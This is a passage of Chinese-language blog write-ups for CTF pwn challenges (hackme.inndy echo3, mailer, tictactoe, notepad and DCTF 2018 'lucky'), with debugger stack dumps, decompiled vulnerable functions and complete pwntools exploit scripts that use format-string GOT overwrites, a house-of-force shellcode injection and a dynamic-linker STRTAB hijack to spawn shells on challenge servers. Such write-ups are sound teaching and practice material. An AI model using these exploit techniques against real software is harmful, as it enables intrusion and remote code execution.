0x0... ↓0f:003c│ 0xffffaf58 —▸ 0xffffaf30 ◂— 'n,D*'10:0040│ 0xffffaf5c ◂— 0x519ab90011:0044│ 0xffffaf60 ◂— 0x012:0048│ 0xffffaf64 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x113:004c│ ebp 0xffffaf68 —▸ 0xffffcfc8 ◂— 0x014:0050│ 0xffffaf6c —▸ 0x804877b (main+236) ◂— mov eax, 015:0054│ 0xffffaf70 ◂— 0x0... ↓ 这是我用到的栈情况,可以通过gdb调试，在alloca函数上下个断点，然后通过 set $eax=0x20来获得 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899pwndbg&gt; stack 10000:0000│ esp 0xffbf8a6c —▸ 0x804864b (hardfmt+133) ◂— add esp, 0x1001:0004│ 0xffbf8a70 —▸ 0x804a080 (buff) ◂— 0x35353325 ('%355')... ↓03:000c│ 0xffbf8a78 ◂— 0x100004:0010│ 0xffbf8a7c ◂— 0x105:0014│ 0xffbf8a80 ◂— 0x6c018c2e06:0018│ 0xffbf8a84 —▸ 0x804829c ◂— add byte ptr [ecx + ebp*2 + 0x62], ch07:001c│ 0xffbf8a88 —▸ 0xf77ec918 ◂— 0x008:0020│ 0xffbf8a8c ◂— 0x009:0024│ 0xffbf8a90 —▸ 0xffbf8ace ◂— 0x308040a:0028│ 0xffbf8a94 —▸ 0xf75fe018 ◂— stosd dword ptr es:[edi], eax0b:002c│ 0xffbf8a98 —▸ 0xf765321b (setbuffer+11) ◂— add ebx, 0x151de50c:0030│ 0xffbf8a9c —▸ 0x80485d2 (hardfmt+12) ◂— add ebx, 0x1a2e0d:0034│ 0xffbf8aa0 —▸ 0xf77d67eb (_dl_fixup+11) ◂— add esi, 0x158150e:0038│ 0xffbf8aa4 ◂— 0x10f:003c│ 0xffbf8aa8 —▸ 0xffbf8a80 ◂— 0x6c018c2e10:0040│ 0xffbf8aac ◂— 0x3b9d010011:0044│ 0xffbf8ab0 —▸ 0xffbf8b18 ◂— 0x012:0048│ 0xffbf8ab4 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x113:004c│ ebp 0xffbf8ab8 —▸ 0xffbf8b18 ◂— 0x014:0050│ 0xffbf8abc —▸ 0x804877b (main+236) ◂— mov eax, 015:0054│ 0xffbf8ac0 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x116:0058│ 0xffbf8ac4 —▸ 0x804a060 (magic) ◂— 0x6c018c2e //偏移为2117:005c│ 0xffbf8ac8 —▸ 0xf76c92ac (__close_nocancel+18) ◂— mov ebx, edx18:0060│ 0xffbf8acc —▸ 0x804874a (main+187) ◂— add esp, 0x1019:0064│ 0xffbf8ad0 ◂— 0x31a:0068│ 0xffbf8ad4 —▸ 0x804a060 (magic) ◂— 0x6c018c2e1b:006c│ 0xffbf8ad8 ◂— 0x41c:0070│ 0xffbf8adc —▸ 0x80486a6 (main+23) ◂— add ebx, 0x195a1d:0074│ 0xffbf8ae0 ◂— 0x80001e:0078│ 0xffbf8ae4 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db01f:007c│ 0xffbf8ae8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q') //这是选择的跳板20:0080│ 0xffbf8aec —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3' //21:0084│ 0xffbf8af0 ◂— 0x122:0088│ 0xffbf8af4 ◂— 0x023:008c│ 0xffbf8af8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')24:0090│ 0xffbf8afc ◂— 0x325:0094│ 0xffbf8b00 ◂— 0x6771084c26:0098│ 0xffbf8b04 ◂— 0xedf6843527:009c│ 0xffbf8b08 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')28:00a0│ 0xffbf8b0c ◂— 0x3b9d010029:00a4│ 0xffbf8b10 —▸ 0xffbf8b30 ◂— 0x12a:00a8│ 0xffbf8b14 ◂— 0x0... ↓2c:00b0│ 0xffbf8b1c —▸ 0xf760b637 (__libc_start_main+247) ◂— add esp, 0x102d:00b4│ 0xffbf8b20 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓2f:00bc│ 0xffbf8b28 ◂— 0x030:00c0│ 0xffbf8b2c —▸ 0xf760b637 (__libc_start_main+247) ◂— add esp, 0x1031:00c4│ 0xffbf8b30 ◂— 0x132:00c8│ 0xffbf8b34 —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3'33:00cc│ 0xffbf8b38 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')34:00d0│ 0xffbf8b3c ◂— 0x0... ↓37:00dc│ 0xffbf8b48 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db038:00e0│ 0xffbf8b4c —▸ 0xf77ecc04 ◂— 0x039:00e4│ 0xffbf8b50 —▸ 0xf77ec000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f3c3a:00e8│ 0xffbf8b54 ◂— 0x03b:00ec│ 0xffbf8b58 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓3d:00f4│ 0xffbf8b60 ◂— 0x03e:00f8│ 0xffbf8b64 ◂— 0xc11ec0133f:00fc│ 0xffbf8b68 ◂— 0x7f634e0240:0100│ 0xffbf8b6c ◂— 0x0... ↓43:010c│ 0xffbf8b78 ◂— 0x144:0110│ 0xffbf8b7c —▸ 0x80484b0 (_start) ◂— xor ebp, ebp45:0114│ 0xffbf8b80 ◂— 0x046:0118│ 0xffbf8b84 —▸ 0xf77dd010 (_dl_runtime_resolve+16) ◂— pop edx47:011c│ 0xffbf8b88 —▸ 0xf77d7880 (_dl_fini) ◂— push ebp48:0120│ 0xffbf8b8c —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x149:0124│ 0xffbf8b90 ◂— 0x14a:0128│ 0xffbf8b94 —▸ 0x80484b0 (_start) ◂— xor ebp, ebp4b:012c│ 0xffbf8b98 ◂— 0x04c:0130│ 0xffbf8b9c —▸ 0x80484e2 (_start+50) ◂— hlt 4d:0134│ 0xffbf8ba0 —▸ 0x804868f (main) ◂— lea ecx, [esp + 4]4e:0138│ 0xffbf8ba4 ◂— 0x14f:013c│ 0xffbf8ba8 —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3'50:0140│ 0xffbf8bac —▸ 0x80487a0 (__libc_csu_init) ◂— push ebp51:0144│ 0xffbf8bb0 —▸ 0x8048800 (__libc_csu_fini) ◂— ret 52:0148│ 0xffbf8bb4 —▸ 0xf77d7880 (_dl_fini) ◂— push ebp53:014c│ 0xffbf8bb8 —▸ 0xffbf8bbc —▸ 0xf77ec918 ◂— 0x054:0150│ 0xffbf8bbc —▸ 0xf77ec918 ◂— 0x055:0154│ 0xffbf8bc0 ◂— 0x156:0158│ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3' //偏移为8557:015c│ 0xffbf8bc8 ◂— 0x058:0160│ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q') //偏移为8759:0164│ 0xffbf8bd0 —▸ 0xffbfa2db ◂— 0x5f474458 ('XDG_')5a:0168│ 0xffbf8bd4 —▸ 0xffbfa30d ◂— 0x4d4f4e47 ('GNOM')5b:016c│ 0xffbf8bd8 —▸ 0xffbfa339 ◂— 0x435f434c ('LC_C')5c:0170│ 0xffbf8bdc —▸ 0xffbfa34e ◂— 0x5f474458 ('XDG_')5d:0174│ 0xffbf8be0 —▸ 0xffbfa368 ◂— 0x5f474458 ('XDG_')5e:0178│ 0xffbf8be4 —▸ 0xffbfa37d ◂— 0x495f5451 ('QT_I')5f:017c│ 0xffbf8be8 —▸ 0xffbfa38f ◂— 'LOGNAME=zs0zrc'60:0180│ 0xffbf8bec —▸ 0xffbfa39e ◂— 'USER=zs0zrc'61:0184│ 0xffbf8bf0 —▸ 0xffbfa3aa ◂— 0x48544150 ('PATH')62:0188│ 0xffbf8bf4 —▸ 0xffbfa43b ◂— 'XDG_VTNR=7'63:018c│ 0xffbf8bf8 —▸ 0xffbfa446 ◂— 0x4d4f4e47 ('GNOM') 先爆破，泄露出libc地址和栈的地址 12345678910111213141516while True: p = process('./echo3') payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#',drop = True) if data[-3:] == '637': break p.close()leak_libc = int(data,16) - 247libc_base = leak_libc - libc.symbols['__libc_start_main']log.info("libc address &#123;&#125;".format(hex(libc_base)))leak_stack = int(p.recv().strip('\n'),16)log.info("leak stack address&#123;&#125;".format(hex(leak_stack)))stack1 = leak_stack - 0x10cstack2 = leak_stack - 0x108 因为格式化字符串在bss段上，所以先要在栈上找到指向栈的指针，这里用到的是 121f:007c│ 0xffbf8ae8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')20:0080│ 0xffbf8aec —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3' 修改为 121f:007c│ 0xffbf8ae8 —▸ 0xffbf8bcc —▸0x804a000 (_GLOBAL_OFFSET_TABLE_)20:0080│ 0xffbf8aec —▸ 0xffbf8bc4 —▸0x804a060 (magic) payload: 123payload1 = "%&#123;&#125;c%&#123;&#125;$hn".format(stack1 &amp; 0xffff, 30)payload1 += "%&#123;&#125;c%&#123;&#125;$hn".format(4, 31)payload1 += '1111' 这时再通过修改0xffbf8bcc和0xffbf8bc4 的内容为 print_got和printf_got+2 1232:00c8│ 0xffbf8b34 —▸ 0xffbf8bc4 —▸ 0xffbf8ac4 —▸ 0x804a01433:00cc│ 0xffbf8b38 —▸ 0xffbf8bcc —▸ 0xffbf8ac0 —▸ 0x804a016 payload: 123payload2 = "%&#123;&#125;c%&#123;&#125;$hn".format(printf_got &amp; 0xffff, 85)payload2 += "%&#123;&#125;c%&#123;&#125;$hn".format(2, 87)payload2 += "2222" 最后向printf_got中写入system函数地址，发送’/bin/sh\x00’字符串，getshell payload: 123payload3 = "%&#123;&#125;c%&#123;&#125;$hhn".format(system&gt;&gt; 16 &amp; 0xff, 20)payload3 += "%&#123;&#125;c%&#123;&#125;$hn".format((system&amp; 0xffff) - (system &gt;&gt; 16 &amp; 0xff), 21)payload3 += "3333" 在这里膜下M4X大佬和D4rk3r大佬参考了他们的wirteupM4XD4rk3r]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mailer writeup]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-mailer-writeup%2F</url>
    <content type="text"><![CDATA[防护机制 1234567[*] &apos;/home/zs0zrc/pwn/Scoreboard/mailer/mailer&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 程序逻辑很简单，只有两个功能 write mail 和dump 1234567891011121314151617181920212223242526272829int service()&#123; unsigned int v0; // eax qmemcpy(&amp;helloworld, &amp;unk_8048AA0, 0x48u); root = &amp;helloworld; memcpy(&amp;helloworld + 72, "Hello, World", 0xCu); while ( 1 ) &#123; while ( 1 ) &#123; puts("0. Exit"); puts("1. Write mail"); puts("2. Dump mails"); printf("Action: "); v0 = readint(); if ( v0 != 1 ) break; write_mail(); &#125; if ( v0 &lt; 1 ) break; if ( v0 == 2 ) dump_mail(); else puts("Invalid choice"); &#125; return puts("Bye");&#125; 漏洞在于writemail函数中用了两个 gets来读取数据，而mail的大小size存储在chunk中，dump是根据chunk中存储的mail大小来输出的。所以可以修改mail的大小，从而泄露出堆的地址。同时也可以溢出修改topchunk的size字段，所以这个很明显是用house_of_force来做。因为没开NX，所以可以往堆里写shellcode，然后利用house_of_force修改puts_got为shellcode的地址来getshell 123456789101112131415161718char *write_mail()&#123; int size; // eax char *mail; // ST1C_4 char *result; // eax printf("Content Length: "); size = readint(); mail = new_mail(size); printf("Title: "); gets(mail + 4); printf("Content: "); gets(mail + 72); *mail = root; result = mail; root = mail; return result;&#125; 具体步骤： 1234new一个mail来存放shellcode，同时修改这个mail的size字段再new一个mail，修改top_chunk的size字段为0xffffffff利用dump函数泄露出heap地址利用house_of_force修改puts_got为shellcode地址 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./mailer') elf = ELF('./mailer') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7721' p = remote(host,port) elf = ELF('./mailer')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def mail(size,title,content): ru('Action: ') sl('1') ru('Length: ') sl(str(size)) ru('Title: ') sl(title) ru('Content: ') sl(content) shellcode = asm(shellcraft.sh())target = 0x0804A030payload = 'a'*12+ p32(0xffffffff)mail(50,'a'*16*4 + p32(0x40),shellcode + '######')mail(10,'aaaa',payload)rc()sl('2')ru('######')leak_heap = u32(p.recv(12)[6:10])log.info(hex(leak_heap))shellcode_add = leak_heap + 72topchunk = leak_heap + 0xd0evil_size = target - topchunk - 0x14 - 72print evil_sizemail(evil_size,'aaaa','bbbb')mail(30,p32(shellcode_add)*2,'dddd')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tictactoe2 writeup]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-tictactoe2-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 123456[*] &apos;/home/zs0zrc/pwn/Scoreboard/tictactoe/tictactoe&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这题文件和tictactoe1是一样的，只不过这个要求getshell，漏洞点也就是一个任意地址写，我对着分析了半天除了想到将n修改成0，使得可以进行9次任意地址写 ，就想不到什么了，看了大佬的writeup才发现是用 ret2_dl_runtime_resolve做的 12345678910111213for ( i = 0; i &lt;= 8 &amp;&amp; !sub_80487F6(); ++i ) &#123; if ( n == -1 ) &#123; sub_80489C0(); &#125; else &#123; sub_8048762(); sub_8048A4B(); &#125; n = -n; &#125; elf文件各个节的信息： 1234567891011121314151617181920212223242526LOAD:0804AF14 stru_804AF14 Elf32_Dyn &lt;1, &lt;1&gt;&gt; ; DATA XREF: LOAD:080480BC↑oLOAD:0804AF14 ; .got.plt:0804B000↓oLOAD:0804AF14 ; DT_NEEDED libc.so.6LOAD:0804AF1C Elf32_Dyn &lt;0Ch, &lt;8048498h&gt;&gt; ; DT_INITLOAD:0804AF24 Elf32_Dyn &lt;0Dh, &lt;8048DA4h&gt;&gt; ; DT_FINILOAD:0804AF2C Elf32_Dyn &lt;19h, &lt;804AF04h&gt;&gt; ; DT_INIT_ARRAYLOAD:0804AF34 Elf32_Dyn &lt;1Bh, &lt;8&gt;&gt; ; DT_INIT_ARRAYSZLOAD:0804AF3C Elf32_Dyn &lt;1Ah, &lt;804AF0Ch&gt;&gt; ; DT_FINI_ARRAYLOAD:0804AF44 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt; ; DT_FINI_ARRAYSZLOAD:0804AF4C Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASHLOAD:0804AF54 Elf32_Dyn &lt;5, &lt;80482F8h&gt;&gt; ; DT_STRTAB//要修改的地方LOAD:0804AF5C Elf32_Dyn &lt;6, &lt;80481D8h&gt;&gt; ; DT_SYMTABLOAD:0804AF64 Elf32_Dyn &lt;0Ah, &lt;0BCh&gt;&gt; ; DT_STRSZLOAD:0804AF6C Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt; ; DT_SYMENTLOAD:0804AF74 Elf32_Dyn &lt;15h, &lt;0&gt;&gt; ; DT_DEBUGLOAD:0804AF7C Elf32_Dyn &lt;3, &lt;804B000h&gt;&gt; ; DT_PLTGOTLOAD:0804AF84 Elf32_Dyn &lt;2, &lt;68h&gt;&gt; ; DT_PLTRELSZLOAD:0804AF8C Elf32_Dyn &lt;14h, &lt;11h&gt;&gt; ; DT_PLTRELLOAD:0804AF94 Elf32_Dyn &lt;17h, &lt;8048430h&gt;&gt; ; DT_JMPRELLOAD:0804AF9C Elf32_Dyn &lt;11h, &lt;8048418h&gt;&gt; ; DT_RELLOAD:0804AFA4 Elf32_Dyn &lt;12h, &lt;18h&gt;&gt; ; DT_RELSZLOAD:0804AFAC Elf32_Dyn &lt;13h, &lt;8&gt;&gt; ; DT_RELENTLOAD:0804AFB4 Elf32_Dyn &lt;6FFFFFFEh, &lt;80483D8h&gt;&gt; ; DT_VERNEEDLOAD:0804AFBC Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUMLOAD:0804AFC4 Elf32_Dyn &lt;6FFFFFF0h, &lt;80483B4h&gt;&gt; ; DT_VERSYMLOAD:0804AFCC Elf32_Dyn &lt;0&gt; ; DT_NULL 先简单回顾下_dl_fixup的流程 12345根据rel_offset 得到函数reloc结构体在JMPREL中的位置根据reloc结构体中的r_offset 得到函数在got表中的地址根据reloc结构体中的r_info&gt;&gt;8得到函数的sym结构体在symtab中的位置根据sym结构中的st.name 得到函数字符串在strtab表中的位置最后根据得到的函数名称解析函数地址，将函数地址写入got表 在这里因为有任意地址写漏洞，并且存储着DT_STRTAB等节地址的地方是可以写的 所以可以修改DT_STRTAB。因为程序最后会执行memset函数，所以选择修改DT_STRTAB，使得在memset在调用_dl_fixup函数时查找函数名字符串时获得的字符串是”system“，最终解析出system函数，并且向n写入’sh\x00’，那么最后执行memset时就会执行system(‘sh\x00’) 1memset(&amp;n, 0, 0x18u); memset函数的字符串在DT_STRTAB中的偏移为 68 system函数的字符串的地址 —&gt;[0x804900c] target = 0x8049fc8 将DT_STRTAB修改为 target= system_add - 68，这样的话当memset函数去DT_STRTAB中查找字符串时就会得到”system”字符串 12345678910111213for ( i = 0; i &lt;= 8 &amp;&amp; !sub_80487F6(); ++i ) &#123; if ( n == -1 ) &#123; sub_80489C0(); &#125; else &#123; sub_8048762(); sub_8048A4B(); &#125; n = -n; &#125; 不过这里还要注意的是往n写入sh字符串时，这里会每次都会取反，所以在 i 等于奇数的时候写入sh字符串，最后在内存中的就是输入的sh字符串了。 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./tictactoe') elf = ELF('./tictactoe') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7714' p = remote(host,port) elf = ELF('./tictactoe')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print &#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))def change(addr,value): ru("flavor):") sl('9') sleep(0.1) sl(value) offset = addr - 0x804B056 ru('flavor): ') sl(str(offset))targe = 0x8049fc8addr_STRTAB = 0x0804AF58n = 0x0804B048bss = elf.bss()rc()sl('1')change(n,'\x99') #0change(n,'\x73') #1change(addr_STRTAB,'\xc8') #2change(n + 1,'\x68') #3change(addr_STRTAB + 1,'\x9f') #4change(n+2,'\x00') #5change(n+0x10,'\xff') #6change(bss+0x100,'\xff') #7change(bss+0x100,'\xff') #8rc()p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tictactoe1 writeup]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-tictactoe-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 123456[*] &apos;/home/zs0zrc/pwn/Scoreboard/tictactoe/tictactoe&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这个程序是模拟下三子棋的机器人，程序的漏洞在 12345678910111213141516171819202122unsigned int sub_8048A4B()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf("\nInput move (9 to change flavor): "); v1 = read_int();//没有对输入的数字进行检查 if ( v1 == 9 ) &#123; read(0, &amp;buf, 4u); byte_804B04C = buf; sub_8048A4B(); &#125; else &#123; *(v1 + 0x804B056) = byte_804B04C;//可以输入负数，造成任意地址写，但是只能修改三次 if ( sub_80486F0(v1) ) *(v1 + 0x804B04D) = -1; &#125; return __readgsdword(0x14u) ^ v3; 同时程序中有输出flag的代码 1234567891011121314151617else if ( v1 == -1 ) &#123; print_msg("You win. Inconceivable!"); fd = open("flag_simple", 0); v5 = read(fd, buf, 0x100u); if ( fd &lt;= 0 || v5 &lt;= 0 ) &#123; print_msg("Can not read flag! Pls contact admin"); &#125; else &#123; buf[v5] = 0; printf("Here is your flag: %s\n", buf); print_msg("You need a shell to get another flag"); &#125; exit(0); &#125; 所以只要修改got表中没有被调用过的函数，使其指向这段代码的地址就好了。这里之所以要修改没调用的是因为没调用的函数在其got表中存储的是plt表的地址，是指向程序代码段的，如果是调用过的函数，它got表中存储的是libc的地址。 这里选择修改puts_got –&gt;[0x0804B024] 计算偏移 offset = -50 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./tictactoe') elf = ELF('./tictactoe') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7714' p = remote(host,port) elf = ELF('./tictactoe')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print &#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))#target = elf.symbols['puts']#target = 0x0804B024vuln = 0x804B04Doffest = -50#gdb.attach(p,'b *0x08048A9E')ru("Play (1)st or (2)nd? ")sl('1')ru("flavor):")sl('9')sl(chr(0x46))ru(" flavor):")sl('-50')ru(" flavor):")sl('9')sl(chr(0x8c))ru(" flavor):")sl('-49')sl('1')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DCTF Quals 2018 pwn题简单复现]]></title>
    <url>%2F2018%2F09%2F24%2F2018-9-24-DefCamp-CTF-pwn%E9%A2%98%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[这个比赛我就做出了第一道pwn….C++逆向真的是看到脑壳疼，还有一个pwn题用到了CVE-2018-11235 ….真的是打扰了 lucky 这道题是猜随机数，只是这题目是用C++写的，逆向看的有点难受 因为随机数的seed在栈上，加上它在输入name时，用了strcpy函数，没有限制输入的长度，所以可以覆盖seed的值为0x61616161。加上它在输入名字后又srand了一次，所以seed就被我们控制了，产生的随机数也就是确定的。 ida反编译看到的代码是长这样的 生成随机数的源码 123456789#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main()&#123; srand(0x61616161); for(int i=0;i&lt;100;i++)&#123; printf("%d\n",rand()); &#125; return 0;&#125; exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./lucky') elf = ELF('./lucky') libc = elf.libcelse: host = '167.99.143.206' port = '65031' p = remote(host,port) elf = ELF('./lucky')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))fp = open('random.txt')l = []for i in fp: l.append(i) rc()sl('a'*0x2c4)for i in range(100): rc() sd(l[i])rc()print rc()#DCTF&#123;8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa&#125;p.interactive() more lucky 这题比赛时没做出来，它也是和随机数有关的，但是它没有lucky的漏洞，不能覆盖栈上的seed。 先简单分析下文件,ida反编译出来的代码长这样 拖进编辑器里修改成能看版： 1234567891011121314151617181920212223242526272829303132333435__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; times = time(0LL); srand(times / 10); cout&lt;&lt;"Hello, there!"&lt;&lt;endl； cout&lt;&lt;"What is your name?"&lt;&lt;endl; cin.getline(&amp;name); sub_2033(&amp;v28, times / 10000, times / 10000, times, v6, v7); serv_time = v28; cout&lt;&lt;"I am glad to know you, "&lt;&lt;name&lt;&lt;"!"&lt;&lt;endl; cout&lt;&lt;"Server time: "&lt;&lt;serv_time&lt;&lt;endl; cout&lt;&lt;"If you guess the next 100 random numbers I shall give you the flag!"&lt;&lt;endl; for ( i = 0; i &lt;= 99; ++i ) &#123; v30 = rand(); cout&lt;&lt;"What number am I thinking of? ["&lt;&lt;i&lt;&lt;"/100]"&lt;&lt;endl; cin&gt;&gt;buf; v29 = sub_1FE9(&amp;buf, 0LL, 10LL); if ( v29 != v30 ) &#123; cout&lt;&lt;"Wow that is wrong!"&lt;&lt;endl; return -1 &#125; cout&lt;&lt;"Wow that is corect!"&lt;&lt;endl; &#125; ifs = ifstream("./flag2"); if ( is_open(ifs) ) &#123; ifs.getline(flag); cout &lt;&lt; flag &lt;&lt; endl; ifs.close(); &#125; return 0;&#125; 这题和lucky的不同在于它使用的srand(time/10)来做随机数的种子，并且它将 time/10000打印出来了。 程序先根据time(0)生成服务器时间，然后srand(times/10)来设置seed的值。用户输入name后，将times/10000打印出来。而且它没有再次srand(),所以需要找到seed的值。这里它使用srand(times/10)来初始化seed值，并且只有最后三位是未知的。因为time(0)返回以秒为单位的时间，它用times/10来做srand()的参数，最后三位数每隔十秒增加一次，这使得它很容易受到暴力攻击。 根据大佬的writeup，暴力猜它服务器的时间，猜对的可能性为1/1000，所以写脚本暴力跑 生成随机数的c代码： 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; int main(int argc, char **argv) &#123; int seed = atoi(argv[1]); srand(seed); for (int i = 0; i &lt; 100; i++) &#123; printf("%d\n", rand()); &#125; return 0;&#125; exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env pythonfrom pwn import *import subprocesslocal = 1if local: p = process('./lucky2') elf = ELF('./lucky2') libc = elf.libcelse: host = '167.99.143.206' port = '65032' p = remote(host,port) elf = ELF('./lucky2') context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)times = 153778000for i in range(1000): times += 1 print"times--&gt;[&#123;&#125;]".format(times) p = remote("167.99.143.206", 65032) rc() sl('aaaa') number = subprocess.check_output(["./rand1", str(times)]).split('\n') try: for i in range(100): ru("100]") sl(number[i]) p.interactive() #DCTF&#123;2e7aaa899a8b212ea6ebda3112d24559f2d2c540a9a29b1b47477ae8e5f20ace&#125; except EOFError: pass Online linter 这就是那道用到了CVE的题目，orz , drl。以后再研究吧 贴下大佬writeup的地址 writeup]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[notepad writeup]]></title>
    <url>%2F2018%2F09%2F23%2F2018-9-22-notepad-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 123456[*] &apos;/home/zs0zrc/pwn/Scoreboard/notepad/notepad&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这题的漏洞主要在于 notepad_open函数中的menu函数，它对输入的上界进行了检查，但是没对下界进行检查，导致可以输入比 ‘a’小的字符,加上它根据menu的返回值来确定调用函数的位置的，所以可以提前在堆上布置好函数指针，通过输入notepad_open函数，输入特定的字符，来调用布置在堆上的函数指针 12345678910111213141516171819202122int __cdecl menu(int a1)&#123; int result; // eax int i; // [esp+8h] [ebp-10h] int v3; // [esp+Ch] [ebp-Ch] for ( i = 0; *(4 * i + a1); ++i ) printf("%c&gt; %s\n", i + 'a', *(4 * i + a1)); printf("::&gt; "); v3 = getchar() - 'a'; freeline(); if ( v3 &lt; i ) // vuln result = v3 + 1; else result = 0; return result;&#125;//调用函数的代码 v0 = menu(&amp;v4);(*(&amp;v3-&gt;show + v0 - 